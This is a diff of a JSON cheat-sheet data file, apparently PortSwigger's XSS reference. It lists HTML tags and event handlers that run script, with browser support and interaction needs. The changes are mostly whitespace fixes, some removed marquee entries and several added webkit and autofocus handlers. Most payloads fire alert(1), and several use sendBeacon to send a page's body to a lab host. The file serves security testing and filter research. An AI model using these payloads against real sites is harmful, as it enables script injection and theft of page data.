@@ -6,7 +6,7 @@
                 "tag": "menu",
                 "code": "<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>",
                 "browsers": [
-                    "firefox"                    
+                    "firefox"
                 ],
                 "interaction": true
             }
@@ -33,7 +33,7 @@
                 "tag": "video",
                 "code": "<video controls onsuspend=alert(1)><source src=validvideo.mp4 type=video/mp4></video>",
                 "browsers": [
-                    "chrome",                    
+                    "chrome",
                     "firefox",
                     "safari"
                 ],
@@ -43,7 +43,7 @@
                 "tag": "audio",
                 "code": "<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
                 "browsers": [
-                    "chrome",                    
+                    "chrome",
                     "firefox",
                     "safari"
                 ],
@@ -58,7 +58,7 @@
                 "tag": "video",
                 "code": "<video controls onprogress=alert(1)><source src=validvideo.mp4 type=video/mp4></video>",
                 "browsers": [
-                    "chrome",                    
+                    "chrome",
                     "firefox",
                     "safari"
                 ],
@@ -68,7 +68,7 @@
                 "tag": "audio",
                 "code": "<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
                 "browsers": [
-                    "chrome",                    
+                    "chrome",
                     "firefox",
                     "safari"
                 ],
@@ -83,7 +83,7 @@
                 "tag": "video",
                 "code": "<video controls ondurationchange=alert(1)><source src=validvideo.mp4 type=video/mp4></video>",
                 "browsers": [
-                    "chrome",                    
+                    "chrome",
                     "firefox",
                     "safari"
                 ],
@@ -93,7 +93,7 @@
                 "tag": "audio",
                 "code": "<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
                 "browsers": [
-                    "chrome",                    
+                    "chrome",
                     "firefox",
                     "safari"
                 ],
@@ -135,9 +135,9 @@
             {
                 "tag": "body",
                 "code": "<body onselectstart=alert(1)>select some text",
-				"browsers": [                    
+                "browsers": [
                     "chrome",
-                    "safari"               
+                    "safari"
                 ],
                 "interaction": true
             }
@@ -149,9 +149,9 @@
             {
                 "tag": "body",
                 "code": "<body onselectionchange=alert(1)>select some text",
-				"browsers": [                    
+                "browsers": [
                     "chrome",
-                    "safari"               
+                    "safari"
                 ],
                 "interaction": true
             }
@@ -163,9 +163,9 @@
             {
                 "tag": "body",
                 "code": "<body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
-				"browsers": [                    
+                "browsers": [
                     "chrome",
-                    "firefox"               
+                    "firefox"
                 ],
                 "interaction": true
             }
@@ -177,7 +177,7 @@
             {
                 "tag": "*",
                 "code": "<* onmousewheel=alert(1) style=display:block>requires scrolling",
-				"browsers": [                    
+                "browsers": [
                     "chrome"
                 ],
                 "interaction": true
@@ -197,7 +197,7 @@
                 ],
                 "interaction": true
             }
-        ]       
+        ]
     },
     "onbeforescriptexecute": {
         "description": "Fires before script is executed",
@@ -205,8 +205,8 @@
             {
                 "tag": "*",
                 "code": "<* onbeforescriptexecute=alert(1)><script>1</script>",
-				"browsers": [                    
-                    "firefox"               
+                "browsers": [
+                    "firefox"
                 ],
                 "interaction": false
             }
@@ -218,8 +218,8 @@
             {
                 "tag": "*",
                 "code": "<* onafterscriptexecute=alert(1)><script>1</script>",
-				"browsers": [                    
-                    "firefox"               
+                "browsers": [
+                    "firefox"
                 ],
                 "interaction": false
             }
@@ -231,8 +231,8 @@
             {
                 "tag": "video",
                 "code": "<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>",
-				"browsers": [                    
-                    "firefox"               
+                "browsers": [
+                    "firefox"
                 ],
                 "interaction": true
             }
@@ -244,8 +244,8 @@
             {
                 "tag": "video",
                 "code": "<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>",
-				"browsers": [                    
-                    "firefox"               
+                "browsers": [
+                    "firefox"
                 ],
                 "interaction": true
             }
@@ -260,7 +260,8 @@
                 "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22print%28%29%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onafterprint%3Dalert%281%29%3E%22%3E%3C%2Fiframe%3E",
                 "browsers": [
                     "chrome",
-                    "firefox"                ],
+                    "firefox"
+                ],
                 "interaction": true
             }
         ]
@@ -271,8 +272,8 @@
             {
                 "tag": "*",
                 "code": "<style>@keyframes x{}<\/style><* style=\"animation-name:x\" onwebkitanimationstart=\"alert(1)\"><\/*>",
-				"browsers": [
-                    "chrome",                   
+                "browsers": [
+                    "chrome",
                     "safari"
                 ],
                 "interaction": false
@@ -280,13 +281,13 @@
         ]
     },
     "onwebkitanimationend": {
-        "description": "Fires when a CSS animation ends",        
+        "description": "Fires when a CSS animation ends",
         "tags": [
             {
                 "tag": "*",
                 "code": "<style>@keyframes x{}<\/style><* style=\"animation-name:x\" onwebkitanimationend=\"alert(1)\"><\/*>",
                 "browsers": [
-                    "chrome",                   
+                    "chrome",
                     "safari"
                 ],
                 "interaction": false
@@ -553,7 +554,7 @@
                 "code": "<body onbeforecopy=\"alert(1)\" contenteditable>test<\/body>",
                 "browsers": [
                     "chrome",
-                    "firefox",                    
+                    "firefox",
                     "safari"
                 ],
                 "interaction": true
@@ -563,7 +564,7 @@
                 "code": "<br onbeforecopy=\"alert(1)\" contenteditable>test<\/br>",
                 "browsers": [
                     "chrome",
-                    "firefox",                    
+                    "firefox",
                     "safari"
                 ],
                 "interaction": true
@@ -1048,7 +1049,7 @@
                     "safari"
                 ],
                 "interaction": true
-            },        
+            },
             {
                 "tag": "listing",
                 "code": "<listing onbeforecopy=\"alert(1)\" contenteditable>test<\/listing>",
@@ -2415,7 +2416,7 @@
                     "safari"
                 ],
                 "interaction": true
-            },        
+            },
             {
                 "tag": "listing",
                 "code": "<listing onbeforecut=\"alert(1)\" contenteditable>test<\/listing>",
@@ -3198,19 +3199,6 @@
             }
         ]
     },
-    "onbounce": {
-        "description": "Fires when the marquee bounces",
-        "tags": [
-            {
-                "tag": "marquee",
-                "code": "<marquee width=1 loop=1 onbounce=alert(1)>XSS<\/marquee>",
-                "browsers": [
-                    "firefox"
-                ],
-                "interaction": false
-            }
-        ]
-    },
     "oncanplay": {
         "description": "Fires if the resource can be played",
         "tags": [
@@ -3382,7 +3370,7 @@
             {
                 "tag": "*",
                 "code": "<* draggable=\"true\" ondragexit=\"alert(1)\" style=display:block>test<\/*>",
-                "browsers": [                
+                "browsers": [
                     "firefox"
                 ],
                 "interaction": true
@@ -3679,26 +3667,13 @@
                     "firefox"
                 ],
                 "interaction": false
-            },        
+            },
             {
                 "tag": "embed",
                 "code": "<embed src=1 onerror=alert(1) type=image\/gif>",
                 "browsers": [
                     "chrome",
                     "safari"
-                ],
-                "interaction": false
-            }
-        ]
-    },
-    "onfinish": {
-        "description": "Fires when the marquee finishes",
-        "tags": [
-            {
-                "tag": "marquee",
-                "code": "<marquee width=1 loop=1 onfinish=alert(1)>XSS<\/marquee>",
-                "browsers": [
-                    "firefox"
                 ],
                 "interaction": false
             }
@@ -3802,7 +3777,7 @@
                 "browsers": [
                     "chrome"
                 ],
-                "interaction": false            
+                "interaction": false
             },
             {
                 "tag": "frame",
@@ -3926,7 +3901,7 @@
                 "tag": "a2",
                 "code": "<a autofocus onfocus=alert(1) href><\/a>",
                 "browsers": [
-                    "chrome"                    
+                    "chrome"
                 ],
                 "interaction": false
             },
@@ -4006,7 +3981,7 @@
                 ],
                 "interaction": false,
                 "hash": "#x"
-            },        
+            },
             {
                 "tag": "bdi",
                 "code": "<bdi id=x tabindex=1 onfocus=alert(1)><\/bdi>",
@@ -5384,7 +5359,7 @@
                 "browsers": [
                     "chrome"
                 ],
-                "interaction": false            
+                "interaction": false
             },
             {
                 "tag": "frame",
@@ -5469,7 +5444,7 @@
                 "browsers": [
                     "chrome"
                 ],
-                "interaction": false                
+                "interaction": false
             },
             {
                 "tag": "link",
@@ -5507,7 +5482,7 @@
                 "tag": "a2",
                 "code": "<a autofocus onfocusin=alert(1) href><\/a>",
                 "browsers": [
-                    "chrome"                    
+                    "chrome"
                 ],
                 "interaction": false
             },
@@ -7519,7 +7494,7 @@
                     "safari"
                 ],
                 "interaction": true
-            },    
+            },
             {
                 "tag": "bdi",
                 "code": "<bdi onpaste=\"alert(1)\" contenteditable>test<\/bdi>",
@@ -8869,7 +8844,7 @@
             {
                 "tag": "*",
                 "code": "<* onpointerover=alert(1) style=display:block>XSS</*>",
-				        "browsers": [
+                "browsers": [
                     "chrome",
                     "firefox",
                     "safari"
@@ -8884,7 +8859,7 @@
             {
                 "tag": "*",
                 "code": "<* onpointerdown=alert(1) style=display:block>XSS</*>",
-				        "browsers": [
+                "browsers": [
                     "chrome",
                     "firefox",
                     "safari"
@@ -8899,7 +8874,7 @@
             {
                 "tag": "*",
                 "code": "<* onpointerenter=alert(1) style=display:block>XSS</*>",
-				        "browsers": [
+                "browsers": [
                     "chrome",
                     "firefox",
                     "safari"
@@ -8914,7 +8889,7 @@
             {
                 "tag": "*",
                 "code": "<* onpointerleave=alert(1) style=display:block>XSS</*>",
-				        "browsers": [
+                "browsers": [
                     "chrome",
                     "firefox",
                     "safari"
@@ -8929,7 +8904,7 @@
             {
                 "tag": "*",
                 "code": "<* onpointermove=alert(1) style=display:block>XSS</*>",
-				        "browsers": [
+                "browsers": [
                     "chrome",
                     "firefox",
                     "safari"
@@ -8944,7 +8919,7 @@
             {
                 "tag": "*",
                 "code": "<* onpointerout=alert(1) style=display:block>XSS</*>",
-				        "browsers": [
+                "browsers": [
                     "chrome",
                     "firefox",
                     "safari"
@@ -8959,7 +8934,7 @@
             {
                 "tag": "*",
                 "code": "<* onpointerup=alert(1) style=display:block>XSS</*>",
-				        "browsers": [
+                "browsers": [
                     "chrome",
                     "firefox",
                     "safari"
@@ -8974,7 +8949,7 @@
             {
                 "tag": "*",
                 "code": "<* onpointerrawupdate=alert(1) style=display:block>XSS</*>",
-				        "browsers": [
+                "browsers": [
                     "chrome"
                 ],
                 "interaction": true
@@ -9178,19 +9153,6 @@
             }
         ]
     },
-    "onstart": {
-        "description": "Fires when the marquee starts",
-        "tags": [
-            {
-                "tag": "marquee",
-                "code": "<marquee onstart=alert(1)>XSS<\/marquee>",
-                "browsers": [
-                    "firefox"
-                ],
-                "interaction": false
-            }
-        ]
-    },
     "onsubmit": {
         "description": "Requires a form submission",
         "tags": [
@@ -9365,7 +9327,7 @@
         "tags": [
             {
                 "tag": "svg",
-                  "code": "<svg onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
+                "code": "<svg onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
                 "browsers": [
                     "chrome"
                 ],
@@ -9373,7 +9335,7 @@
             },
             {
                 "tag": "body",
-                  "code": "<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
+                "code": "<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
                 "browsers": [
                     "chrome",
                     "firefox"
@@ -9443,12 +9405,12 @@
             {
                 "tag": "*",
                 "code": "<* onscrollend=alert(1) style=\"display:block;overflow:auto;border:1px dashed;width:500px;height:100px;\"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test<\/span><\/*>",
-                "browsers": [   
-                    "chrome",         
+                "browsers": [
+                    "chrome",
                     "firefox"
                 ],
                 "interaction": false,
-                "hash":"#x"
+                "hash": "#x"
             }
         ]
     },
@@ -9458,20 +9420,20 @@
             {
                 "tag": "*",
                 "code": "<button popovertarget=x>Click me</button><* onbeforetoggle=alert(1) popover id=x>XSS<\/*>",
-                "browsers": [            
+                "browsers": [
                     "chrome"
                 ],
                 "interaction": true
             }
         ]
     },
-     "ontoggle(popover)": {
+    "ontoggle(popover)": {
         "description": "Fires when the a popop element is toggled",
         "tags": [
             {
                 "tag": "*",
                 "code": "<button popovertarget=x>Click me</button><* ontoggle=alert(1) popover id=x>XSS<\/*>",
-                "browsers": [            
+                "browsers": [
                     "chrome"
                 ],
                 "interaction": true
@@ -9480,7 +9442,7 @@
     },
     "onwebkitplaybacktargetavailabilitychanged": {
         "description": "Fires when the availability of an AirPlay playback target changes",
-	"tags": [
+        "tags": [
             {
                 "tag": "audio",
                 "code": "<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>",
@@ -9488,7 +9450,7 @@
                     "safari"
                 ],
                 "interaction": false
-	    },
+            },
             {
                 "tag": "video",
                 "code": "<video onwebkitplaybacktargetavailabilitychanged=alert(1)>",
@@ -9496,12 +9458,107 @@
                     "safari"
                 ],
                 "interaction": false
-	    }
-	]
+            }
+        ]
+    },
+    "onfocus(autofocus)": {
+        "description": "Fires when a element has focus and the autofocus attribute is used to focus automatically.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onfocus=alert(1) autofocus tabindex=1>",
+                "browsers": [
+                    "chrome",
+                    "firefox",
+                    "safari"
+                ],
+                "interaction": false
+            }
+        ]
+    },
+    "onpointercancel": {
+        "description": "You need to make a selection and drag the text using a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onpointercancel=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "chrome",
+                    "firefox",
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onwebkitmouseforcechanged": {
+        "description": "Requires a click from a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onwebkitmouseforcechanged=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onwebkitmouseforcewillbegin": {
+        "description": "Requires a click from a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onwebkitmouseforcewillbegin=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onwebkitmouseforceup": {
+        "description": "Requires a click from a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onwebkitmouseforceup=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onwebkitmouseforcedown": {
+        "description": "Requires a click from a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onwebkitmouseforcedown=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onwebkitwillrevealbottom": {
+        "description": "Requires a click from a laptop touchpad.",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onwebkitwillrevealbottom=alert(1)>XSS<\/*>",
+                "browsers": [
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]
     },
     "onwebkitpresentationmodechanged": {
         "description": "Fires when a video changes full screen status",
-	"tags": [
+        "tags": [
             {
                 "tag": "video",
                 "code": "<video controls src=validvideo.mp4 onwebkitpresentationmodechanged=alert(1)>",
@@ -9509,12 +9566,12 @@
                     "safari"
                 ],
                 "interaction": true
-	    }
-	]
+            }
+        ]
     },
     "onwebkitfullscreenchange": {
         "description": "Fires when a video changes full screen status",
-	"tags": [
+        "tags": [
             {
                 "tag": "video",
                 "code": "<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>",
@@ -9522,7 +9579,7 @@
                     "safari"
                 ],
                 "interaction": true
-	    }
-	]
+            }
+        ]
     }
 }
